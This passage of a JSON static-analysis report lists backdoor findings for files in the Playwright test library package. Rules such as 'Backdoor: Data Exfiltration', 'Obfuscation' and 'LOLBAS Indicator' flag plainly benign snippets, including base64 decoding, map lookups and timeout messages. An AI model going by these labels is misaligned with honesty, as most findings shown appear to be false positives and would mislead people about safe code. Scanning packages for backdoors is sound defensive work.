                      "markdown": "`);\n      if (!result) throw new Error('test.info() can only be called while test is running');\n      return result;\n    };\n    this.test = test;\n  }\n  _currentSuite(title) {\n    const suite = (0, _globals.currentlyLoadingFileSuite)();\n    if (!suite) {\n      throw new Error([`Playwright Test did not expect ${title} to be called here.`, `Most common reasons include:`, `- You are calling ${title} in a configuration file.`, `- You are calling ${title} in a file that is imported by the configuration file.`, `- You have two different versions of @playwright/test. This usually happens`, `  when one of the d`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/testType.js"
                },
                "region": {
                  "startLine": 257,
                  "startColumn": 6,
                  "endLine": 257,
                  "endColumn": 17,
                  "snippet": {
                    "text": "}\nexports.TestTypeImpl = TestTypeImpl;\nfunction throwIfRunningInsideJest() {\n  if (process.env.JEST_WORKER_ID) {\n    const packageManagerCommand = (0, _utils.getPackageManagerExecCommand)();\n    throw new Error(`Playwright Test needs to be invoked via '${packageManagerCommand} playwright test' and excluded from Jest test runs.\\n` + `Creating one directory for Playwright tests and one for Jest is the recommended way of doing it.\\n` + `See https://playwright.dev/docs/intro for more information about Playwright Test.`);\n  }\n",
                    "rendered": {
                      "text": "}\nexports.TestTypeImpl = TestTypeImpl;\nfunction throwIfRunningInsideJest() {\n  if (process.env.JEST_WORKER_ID) {\n    const packageManagerCommand = (0, _utils.getPackageManagerExecCommand)();\n    throw new Error(`Playwright Test needs to be invoked via '${packageManagerCommand} playwright test' and excluded from Jest test runs.\\n` + `Creating one directory for Playwright tests and one for Jest is the recommended way of doing it.\\n` + `See https://playwright.dev/docs/intro for more information about Playwright Test.`);\n  }\n",
                      "markdown": "`}\nexports.TestTypeImpl = TestTypeImpl;\nfunction throwIfRunningInsideJest() {\n  if (process.env.JEST_WORKER_ID) {\n    const packageManagerCommand = (0, _utils.getPackageManagerExecCommand)();\n    throw new Error(`Playwright Test needs to be invoked via '${packageManagerCommand} playwright test' and excluded from Jest test runs.\\n` + `Creating one directory for Playwright tests and one for Jest is the recommended way of doing it.\\n` + `See https://playwright.dev/docs/intro for more information about Playwright Test.`);\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/isomorphic/teleReceiver.js"
                },
                "region": {
                  "startLine": 222,
                  "startColumn": 69,
                  "endLine": 222,
                  "endColumn": 75,
                  "snippet": {
                    "text": "    return attachments.map(a => {\n      return {\n        ...a,\n        body: a.base64 && globalThis.Buffer ? Buffer.from(a.base64, 'base64') : undefined\n      };\n    });\n  }\n",
                    "rendered": {
                      "text": "    return attachments.map(a => {\n      return {\n        ...a,\n        body: a.base64 && globalThis.Buffer ? Buffer.from(a.base64, 'base64') : undefined\n      };\n    });\n  }\n",
                      "markdown": "`    return attachments.map(a => {\n      return {\n        ...a,\n        body: a.base64 && globalThis.Buffer ? Buffer.from(a.base64, 'base64') : undefined\n      };\n    });\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/isomorphic/teleReceiver.js"
                },
                "region": {
                  "startLine": 222,
                  "startColumn": 60,
                  "endLine": 222,
                  "endColumn": 66,
                  "snippet": {
                    "text": "    return attachments.map(a => {\n      return {\n        ...a,\n        body: a.base64 && globalThis.Buffer ? Buffer.from(a.base64, 'base64') : undefined\n      };\n    });\n  }\n",
                    "rendered": {
                      "text": "    return attachments.map(a => {\n      return {\n        ...a,\n        body: a.base64 && globalThis.Buffer ? Buffer.from(a.base64, 'base64') : undefined\n      };\n    });\n  }\n",
                      "markdown": "`    return attachments.map(a => {\n      return {\n        ...a,\n        body: a.base64 && globalThis.Buffer ? Buffer.from(a.base64, 'base64') : undefined\n      };\n    });\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/isomorphic/teleReceiver.js"
                },
                "region": {
                  "startLine": 222,
                  "startColumn": 16,
                  "endLine": 222,
                  "endColumn": 22,
                  "snippet": {
                    "text": "    return attachments.map(a => {\n      return {\n        ...a,\n        body: a.base64 && globalThis.Buffer ? Buffer.from(a.base64, 'base64') : undefined\n      };\n    });\n  }\n",
                    "rendered": {
                      "text": "    return attachments.map(a => {\n      return {\n        ...a,\n        body: a.base64 && globalThis.Buffer ? Buffer.from(a.base64, 'base64') : undefined\n      };\n    });\n  }\n",
                      "markdown": "`    return attachments.map(a => {\n      return {\n        ...a,\n        body: a.base64 && globalThis.Buffer ? Buffer.from(a.base64, 'base64') : undefined\n      };\n    });\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/isomorphic/teleReceiver.js"
                },
                "region": {
                  "startLine": 161,
                  "startColumn": 68,
                  "endLine": 161,
                  "endColumn": 74,
                  "snippet": {
                    "text": "    (_this$_reporter$onErr = (_this$_reporter7 = this._reporter).onError) === null || _this$_reporter$onErr === void 0 || _this$_reporter$onErr.call(_this$_reporter7, error);\n  }\n  _onStdIO(type, testId, resultId, data, isBase64) {\n    const chunk = isBase64 ? globalThis.Buffer ? Buffer.from(data, 'base64') : atob(data) : data;\n    const test = testId ? this._tests.get(testId) : undefined;\n    const result = test && resultId ? test.results.find(r => r._id === resultId) : undefined;\n    if (type === 'stdout') {\n",
                    "rendered": {
                      "text": "    (_this$_reporter$onErr = (_this$_reporter7 = this._reporter).onError) === null || _this$_reporter$onErr === void 0 || _this$_reporter$onErr.call(_this$_reporter7, error);\n  }\n  _onStdIO(type, testId, resultId, data, isBase64) {\n    const chunk = isBase64 ? globalThis.Buffer ? Buffer.from(data, 'base64') : atob(data) : data;\n    const test = testId ? this._tests.get(testId) : undefined;\n    const result = test && resultId ? test.results.find(r => r._id === resultId) : undefined;\n    if (type === 'stdout') {\n",
                      "markdown": "`    (_this$_reporter$onErr = (_this$_reporter7 = this._reporter).onError) === null || _this$_reporter$onErr === void 0 || _this$_reporter$onErr.call(_this$_reporter7, error);\n  }\n  _onStdIO(type, testId, resultId, data, isBase64) {\n    const chunk = isBase64 ? globalThis.Buffer ? Buffer.from(data, 'base64') : atob(data) : data;\n    const test = testId ? this._tests.get(testId) : undefined;\n    const result = test && resultId ? test.results.find(r => r._id === resultId) : undefined;\n    if (type === 'stdout') {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/isomorphic/teleReceiver.js"
                },
                "region": {
                  "startLine": 162,
                  "startColumn": 37,
                  "endLine": 162,
                  "endColumn": 42,
                  "snippet": {
                    "text": "  }\n  _onStdIO(type, testId, resultId, data, isBase64) {\n    const chunk = isBase64 ? globalThis.Buffer ? Buffer.from(data, 'base64') : atob(data) : data;\n    const test = testId ? this._tests.get(testId) : undefined;\n    const result = test && resultId ? test.results.find(r => r._id === resultId) : undefined;\n    if (type === 'stdout') {\n      var _this$_reporter$onStd, _this$_reporter8;\n",
                    "rendered": {
                      "text": "  }\n  _onStdIO(type, testId, resultId, data, isBase64) {\n    const chunk = isBase64 ? globalThis.Buffer ? Buffer.from(data, 'base64') : atob(data) : data;\n    const test = testId ? this._tests.get(testId) : undefined;\n    const result = test && resultId ? test.results.find(r => r._id === resultId) : undefined;\n    if (type === 'stdout') {\n      var _this$_reporter$onStd, _this$_reporter8;\n",
                      "markdown": "`  }\n  _onStdIO(type, testId, resultId, data, isBase64) {\n    const chunk = isBase64 ? globalThis.Buffer ? Buffer.from(data, 'base64') : atob(data) : data;\n    const test = testId ? this._tests.get(testId) : undefined;\n    const result = test && resultId ? test.results.find(r => r._id === resultId) : undefined;\n    if (type === 'stdout') {\n      var _this$_reporter$onStd, _this$_reporter8;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/isomorphic/teleReceiver.js"
                },
                "region": {
                  "startLine": 151,
                  "startColumn": 32,
                  "endLine": 151,
                  "endColumn": 37,
                  "snippet": {
                    "text": "    var _this$_reporter$onSte2, _this$_reporter6;\n    const test = this._tests.get(testId);\n    const result = test.results.find(r => r._id === resultId);\n    const step = result._stepMap.get(payload.id);\n    step.duration = payload.duration;\n    step.error = payload.error;\n    (_this$_reporter$onSte2 = (_this$_reporter6 = this._reporter).onStepEnd) === null || _this$_reporter$onSte2 === void 0 || _this$_reporter$onSte2.call(_this$_reporter6, test, result, step);\n",
                    "rendered": {
                      "text": "    var _this$_reporter$onSte2, _this$_reporter6;\n    const test = this._tests.get(testId);\n    const result = test.results.find(r => r._id === resultId);\n    const step = result._stepMap.get(payload.id);\n    step.duration = payload.duration;\n    step.error = payload.error;\n    (_this$_reporter$onSte2 = (_this$_reporter6 = this._reporter).onStepEnd) === null || _this$_reporter$onSte2 === void 0 || _this$_reporter$onSte2.call(_this$_reporter6, test, result, step);\n",
                      "markdown": "`    var _this$_reporter$onSte2, _this$_reporter6;\n    const test = this._tests.get(testId);\n    const result = test.results.find(r => r._id === resultId);\n    const step = result._stepMap.get(payload.id);\n    step.duration = payload.duration;\n    step.error = payload.error;\n    (_this$_reporter$onSte2 = (_this$_reporter6 = this._reporter).onStepEnd) === null || _this$_reporter$onSte2 === void 0 || _this$_reporter$onSte2.call(_this$_reporter6, test, result, step);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/isomorphic/teleReceiver.js"
                },
                "region": {
                  "startLine": 149,
                  "startColumn": 28,
                  "endLine": 149,
                  "endColumn": 33,
                  "snippet": {
                    "text": "  }\n  _onStepEnd(testId, resultId, payload) {\n    var _this$_reporter$onSte2, _this$_reporter6;\n    const test = this._tests.get(testId);\n    const result = test.results.find(r => r._id === resultId);\n    const step = result._stepMap.get(payload.id);\n    step.duration = payload.duration;\n",
                    "rendered": {
                      "text": "  }\n  _onStepEnd(testId, resultId, payload) {\n    var _this$_reporter$onSte2, _this$_reporter6;\n    const test = this._tests.get(testId);\n    const result = test.results.find(r => r._id === resultId);\n    const step = result._stepMap.get(payload.id);\n    step.duration = payload.duration;\n",
                      "markdown": "`  }\n  _onStepEnd(testId, resultId, payload) {\n    var _this$_reporter$onSte2, _this$_reporter6;\n    const test = this._tests.get(testId);\n    const result = test.results.find(r => r._id === resultId);\n    const step = result._stepMap.get(payload.id);\n    step.duration = payload.duration;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/isomorphic/teleReceiver.js"
                },
                "region": {
                  "startLine": 140,
                  "startColumn": 61,
                  "endLine": 140,
                  "endColumn": 66,
                  "snippet": {
                    "text": "    var _this$_reporter$onSte, _this$_reporter5;\n    const test = this._tests.get(testId);\n    const result = test.results.find(r => r._id === resultId);\n    const parentStep = payload.parentStepId ? result._stepMap.get(payload.parentStepId) : undefined;\n    const location = this._absoluteLocation(payload.location);\n    const step = new TeleTestStep(payload, parentStep, location);\n    if (parentStep) parentStep.steps.push(step);else result.steps.push(step);\n",
                    "rendered": {
                      "text": "    var _this$_reporter$onSte, _this$_reporter5;\n    const test = this._tests.get(testId);\n    const result = test.results.find(r => r._id === resultId);\n    const parentStep = payload.parentStepId ? result._stepMap.get(payload.parentStepId) : undefined;\n    const location = this._absoluteLocation(payload.location);\n    const step = new TeleTestStep(payload, parentStep, location);\n    if (parentStep) parentStep.steps.push(step);else result.steps.push(step);\n",
                      "markdown": "`    var _this$_reporter$onSte, _this$_reporter5;\n    const test = this._tests.get(testId);\n    const result = test.results.find(r => r._id === resultId);\n    const parentStep = payload.parentStepId ? result._stepMap.get(payload.parentStepId) : undefined;\n    const location = this._absoluteLocation(payload.location);\n    const step = new TeleTestStep(payload, parentStep, location);\n    if (parentStep) parentStep.steps.push(step);else result.steps.push(step);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/isomorphic/teleReceiver.js"
                },
                "region": {
                  "startLine": 138,
                  "startColumn": 28,
                  "endLine": 138,
                  "endColumn": 33,
                  "snippet": {
                    "text": "  }\n  _onStepBegin(testId, resultId, payload) {\n    var _this$_reporter$onSte, _this$_reporter5;\n    const test = this._tests.get(testId);\n    const result = test.results.find(r => r._id === resultId);\n    const parentStep = payload.parentStepId ? result._stepMap.get(payload.parentStepId) : undefined;\n    const location = this._absoluteLocation(payload.location);\n",
                    "rendered": {
                      "text": "  }\n  _onStepBegin(testId, resultId, payload) {\n    var _this$_reporter$onSte, _this$_reporter5;\n    const test = this._tests.get(testId);\n    const result = test.results.find(r => r._id === resultId);\n    const parentStep = payload.parentStepId ? result._stepMap.get(payload.parentStepId) : undefined;\n    const location = this._absoluteLocation(payload.location);\n",
                      "markdown": "`  }\n  _onStepBegin(testId, resultId, payload) {\n    var _this$_reporter$onSte, _this$_reporter5;\n    const test = this._tests.get(testId);\n    const result = test.results.find(r => r._id === resultId);\n    const parentStep = payload.parentStepId ? result._stepMap.get(payload.parentStepId) : undefined;\n    const location = this._absoluteLocation(payload.location);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/isomorphic/teleReceiver.js"
                },
                "region": {
                  "startLine": 122,
                  "startColumn": 28,
                  "endLine": 122,
                  "endColumn": 33,
                  "snippet": {
                    "text": "  }\n  _onTestEnd(testEndPayload, payload) {\n    var _result$errors, _this$_reporter$onTes2, _this$_reporter4;\n    const test = this._tests.get(testEndPayload.testId);\n    test.timeout = testEndPayload.timeout;\n    test.expectedStatus = testEndPayload.expectedStatus;\n    test.annotations = testEndPayload.annotations;\n",
                    "rendered": {
                      "text": "  }\n  _onTestEnd(testEndPayload, payload) {\n    var _result$errors, _this$_reporter$onTes2, _this$_reporter4;\n    const test = this._tests.get(testEndPayload.testId);\n    test.timeout = testEndPayload.timeout;\n    test.expectedStatus = testEndPayload.expectedStatus;\n    test.annotations = testEndPayload.annotations;\n",
                      "markdown": "`  }\n  _onTestEnd(testEndPayload, payload) {\n    var _result$errors, _this$_reporter$onTes2, _this$_reporter4;\n    const test = this._tests.get(testEndPayload.testId);\n    test.timeout = testEndPayload.timeout;\n    test.expectedStatus = testEndPayload.expectedStatus;\n    test.annotations = testEndPayload.annotations;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/isomorphic/teleReceiver.js"
                },
                "region": {
                  "startLine": 111,
                  "startColumn": 28,
                  "endLine": 111,
                  "endColumn": 33,
                  "snippet": {
                    "text": "  }\n  _onTestBegin(testId, payload) {\n    var _this$_reporter$onTes, _this$_reporter3;\n    const test = this._tests.get(testId);\n    if (this._options.clearPreviousResultsWhenTestBegins) test.results = [];\n    const testResult = test._createTestResult(payload.id);\n    testResult.retry = payload.retry;\n",
                    "rendered": {
                      "text": "  }\n  _onTestBegin(testId, payload) {\n    var _this$_reporter$onTes, _this$_reporter3;\n    const test = this._tests.get(testId);\n    if (this._options.clearPreviousResultsWhenTestBegins) test.results = [];\n    const testResult = test._createTestResult(payload.id);\n    testResult.retry = payload.retry;\n",
                      "markdown": "`  }\n  _onTestBegin(testId, payload) {\n    var _this$_reporter$onTes, _this$_reporter3;\n    const test = this._tests.get(testId);\n    if (this._options.clearPreviousResultsWhenTestBegins) test.results = [];\n    const testResult = test._createTestResult(payload.id);\n    testResult.retry = payload.retry;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/isomorphic/teleReceiver.js"
                },
                "region": {
                  "startLine": 433,
                  "startColumn": 14,
                  "endLine": 433,
                  "endColumn": 25,
                  "snippet": {
                    "text": "  metadata: {},\n  preserveOutput: 'always',\n  projects: [],\n  reporter: [[process.env.CI ? 'dot' : 'list']],\n  reportSlowTests: {\n    max: 5,\n    threshold: 15000\n",
                    "rendered": {
                      "text": "  metadata: {},\n  preserveOutput: 'always',\n  projects: [],\n  reporter: [[process.env.CI ? 'dot' : 'list']],\n  reportSlowTests: {\n    max: 5,\n    threshold: 15000\n",
                      "markdown": "`  metadata: {},\n  preserveOutput: 'always',\n  projects: [],\n  reporter: [[process.env.CI ? 'dot' : 'list']],\n  reportSlowTests: {\n    max: 5,\n    threshold: 15000\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/isomorphic/testServerConnection.js"
                },
                "region": {
                  "startLine": 63,
                  "startColumn": 40,
                  "endLine": 63,
                  "endColumn": 45,
                  "snippet": {
                    "text": "        params\n      } = message;\n      if (id) {\n        const callback = this._callbacks.get(id);\n        if (!callback) return;\n        this._callbacks.delete(id);\n        if (error) callback.reject(new Error(error));else callback.resolve(result);\n",
                    "rendered": {
                      "text": "        params\n      } = message;\n      if (id) {\n        const callback = this._callbacks.get(id);\n        if (!callback) return;\n        this._callbacks.delete(id);\n        if (error) callback.reject(new Error(error));else callback.resolve(result);\n",
                      "markdown": "`        params\n      } = message;\n      if (id) {\n        const callback = this._callbacks.get(id);\n        if (!callback) return;\n        this._callbacks.delete(id);\n        if (error) callback.reject(new Error(error));else callback.resolve(result);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/isomorphic/testServerConnection.js"
                },
                "region": {
                  "startLine": 9,
                  "startColumn": 233,
                  "endLine": 9,
                  "endColumn": 238,
                  "snippet": {
                    "text": "etRequireWildcardCache = function (e) { return e ? t : r; })(e); }\nfunction _interopRequireWildcard(e, r) { if (!r && e && e.__esModule) return e; if (null === e || \"object\" != typeof e && \"function\" != typeof e) return { default: e }; var t = _getRequireWildcardCache(r); if (t && t.has(e)) return t.get(e); var n = { __proto__: null }, a = Object.defineProperty && Object.getOwnPropertyDescriptor; for (var u in e) if (\"default\" !== u && Object.prototype.hasOwnProperty.call(e, u)) { var i = a ? Object.getOwnPropertyDescriptor(e, u) : null; i && (i.get || i.set) ? Object.defineProperty(n, u, i) : n[u]",
                    "rendered": {
                      "text": "etRequireWildcardCache = function (e) { return e ? t : r; })(e); }\nfunction _interopRequireWildcard(e, r) { if (!r && e && e.__esModule) return e; if (null === e || \"object\" != typeof e && \"function\" != typeof e) return { default: e }; var t = _getRequireWildcardCache(r); if (t && t.has(e)) return t.get(e); var n = { __proto__: null }, a = Object.defineProperty && Object.getOwnPropertyDescriptor; for (var u in e) if (\"default\" !== u && Object.prototype.hasOwnProperty.call(e, u)) { var i = a ? Object.getOwnPropertyDescriptor(e, u) : null; i && (i.get || i.set) ? Object.defineProperty(n, u, i) : n[u]",
                      "markdown": "`etRequireWildcardCache = function (e) { return e ? t : r; })(e); }\nfunction _interopRequireWildcard(e, r) { if (!r && e && e.__esModule) return e; if (null === e || \"object\" != typeof e && \"function\" != typeof e) return { default: e }; var t = _getRequireWildcardCache(r); if (t && t.has(e)) return t.get(e); var n = { __proto__: null }, a = Object.defineProperty && Object.getOwnPropertyDescriptor; for (var u in e) if (\"default\" !== u && Object.prototype.hasOwnProperty.call(e, u)) { var i = a ? Object.getOwnPropertyDescriptor(e, u) : null; i && (i.get || i.set) ? Object.defineProperty(n, u, i) : n[u]`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/worker/testInfo.js"
                },
                "region": {
                  "startLine": 283,
                  "startColumn": 128,
                  "endLine": 283,
                  "endColumn": 132,
                  "snippet": {
                    "text": "  async _runAsStage(stage, cb) {\n    if (_util.debugTest.enabled) {\n      var _stage$runnable;\n      const location = (_stage$runnable = stage.runnable) !== null && _stage$runnable !== void 0 && _stage$runnable.location ? ` at \"${(0, _util.formatLocation)(stage.runnable.location)}\"` : ``;\n      (0, _util.debugTest)(`started stage \"${stage.title}\"${location}`);\n    }\n    stage.step = stage.stepInfo ? this._addStep({\n",
                    "rendered": {
                      "text": "  async _runAsStage(stage, cb) {\n    if (_util.debugTest.enabled) {\n      var _stage$runnable;\n      const location = (_stage$runnable = stage.runnable) !== null && _stage$runnable !== void 0 && _stage$runnable.location ? ` at \"${(0, _util.formatLocation)(stage.runnable.location)}\"` : ``;\n      (0, _util.debugTest)(`started stage \"${stage.title}\"${location}`);\n    }\n    stage.step = stage.stepInfo ? this._addStep({\n",
                      "markdown": "`  async _runAsStage(stage, cb) {\n    if (_util.debugTest.enabled) {\n      var _stage$runnable;\n      const location = (_stage$runnable = stage.runnable) !== null && _stage$runnable !== void 0 && _stage$runnable.location ? ` at \"${(0, _util.formatLocation)(stage.runnable.location)}\"` : ``;\n      (0, _util.debugTest)(`started stage \"${stage.title}\"${location}`);\n    }\n    stage.step = stage.stepInfo ? this._addStep({\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/worker/testInfo.js"
                },
                "region": {
                  "startLine": 57,
                  "startColumn": 55,
                  "endLine": 57,
                  "endColumn": 64,
                  "snippet": {
                    "text": "  }\n  static _defaultDeadlineForMatcher(timeout) {\n    return {\n      deadline: timeout ? (0, _utils.monotonicTime)() + timeout : 0,\n      timeoutMessage: `Timeout ${timeout}ms exceeded while waiting on the predicate`\n    };\n  }\n",
                    "rendered": {
                      "text": "  }\n  static _defaultDeadlineForMatcher(timeout) {\n    return {\n      deadline: timeout ? (0, _utils.monotonicTime)() + timeout : 0,\n      timeoutMessage: `Timeout ${timeout}ms exceeded while waiting on the predicate`\n    };\n  }\n",
                      "markdown": "`  }\n  static _defaultDeadlineForMatcher(timeout) {\n    return {\n      deadline: timeout ? (0, _utils.monotonicTime)() + timeout : 0,\n      timeoutMessage: `Timeout ${timeout}ms exceeded while waiting on the predicate`\n    };\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/worker/testInfo.js"
                },
                "region": {
                  "startLine": 57,
                  "startColumn": 15,
                  "endLine": 57,
                  "endColumn": 24,
                  "snippet": {
                    "text": "  }\n  static _defaultDeadlineForMatcher(timeout) {\n    return {\n      deadline: timeout ? (0, _utils.monotonicTime)() + timeout : 0,\n      timeoutMessage: `Timeout ${timeout}ms exceeded while waiting on the predicate`\n    };\n  }\n",
                    "rendered": {
                      "text": "  }\n  static _defaultDeadlineForMatcher(timeout) {\n    return {\n      deadline: timeout ? (0, _utils.monotonicTime)() + timeout : 0,\n      timeoutMessage: `Timeout ${timeout}ms exceeded while waiting on the predicate`\n    };\n  }\n",
                      "markdown": "`  }\n  static _defaultDeadlineForMatcher(timeout) {\n    return {\n      deadline: timeout ? (0, _utils.monotonicTime)() + timeout : 0,\n      timeoutMessage: `Timeout ${timeout}ms exceeded while waiting on the predicate`\n    };\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/worker/testInfo.js"
                },
                "region": {
                  "startLine": 49,
                  "startColumn": 29,
                  "endLine": 49,
                  "endColumn": 38,
                  "snippet": {
                    "text": "    const matcherDeadline = timeout ? startTime + timeout : _timeoutManager.kMaxDeadline;\n    const testDeadline = this._timeoutManager.currentSlotDeadline() - 250;\n    const matcherMessage = `Timeout ${timeout}ms exceeded while waiting on the predicate`;\n    const testMessage = `Test timeout of ${this.timeout}ms exceeded`;\n    return {\n      deadline: Math.min(testDeadline, matcherDeadline),\n      timeoutMessage: testDeadline < matcherDeadline ? testMessage : matcherMessage\n",
                    "rendered": {
